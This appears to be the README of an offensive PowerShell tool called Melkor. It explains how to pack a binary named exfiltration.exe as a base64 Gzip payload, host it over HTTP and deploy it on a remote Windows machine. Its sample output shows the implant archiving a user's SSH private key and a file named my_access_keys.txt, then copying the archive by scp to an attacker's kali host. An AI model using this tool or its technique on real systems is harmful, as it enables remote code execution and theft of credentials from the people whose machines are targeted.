# Melkor

Melkor employs a PowerShell execution technique that can deploy base64 encoded, Gzip compressed binaries and execute them. 

## Usage

### Generate payloads

First generate the required payloads in base64 with Gzip compression. For example, to convert binary named `exfiltration.exe` : 
```PowerShell
PS > .\generate_payload.ps1 D:\implant\balrog\x64\Release\exfiltration.exe
{
  "payloadContent": "H4sIAAAAAAAACu19C3gURbZ/z2QmDCFhJpjBRFkY........",
  "payloadSize": 33280
}
```
This can be saved as a JSON and exposed via an HTTP server to be fetched by `deploy_payload.ps1`

### Deploy payloads

Edit `deploy_payload.ps1` with remote Windows machine IP address and path to HTTP server containing the payloads in JSON

Provide a list of payloads to fetch in `$payloads`

```PowerShell
PS > .\deploy_payload.ps1
rajeev@192.168.1.216's password:
INFO: Could not find files for the given pattern(s).
C:\Users\rajeev\.ssh
C:\Users\rajeev\Desktop
tar.exe
Command is tar -cvzf C:\Users\rajeev\AppData\Local\Temp\rk3824.tar C:\Users\rajeev\.ssh C:\Users\rajeev\Desktop
tar: Removing leading drive letter from member names
a Users/rajeev/.ssh
a Users/rajeev/.ssh/id_rsa
a Users/rajeev/.ssh/id_rsa.pub
a Users/rajeev/.ssh/known_hosts
a Users/rajeev/Desktop
a Users/rajeev/Desktop/desktop.ini
a Users/rajeev/Desktop/my_access_keys.txt
Command is scp C:\Users\rajeev\AppData\Local\Temp\rk3824.tar kali@192.168.1.205:landing/rk3824.tar
```